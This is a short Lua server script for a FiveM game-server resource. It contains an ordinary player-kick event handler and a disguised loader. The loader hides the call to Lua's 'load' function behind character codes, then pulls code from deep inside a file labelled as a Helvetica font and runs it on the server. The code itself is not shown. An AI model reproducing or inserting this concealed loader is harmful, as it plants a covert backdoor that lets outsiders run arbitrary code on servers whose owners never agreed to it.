RegisterNetEvent("rex_res:Bye")
AddEventHandler("rex_res:Bye", function()
	DropPlayer(source, '' .. Config.KickMsg)
end)

local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()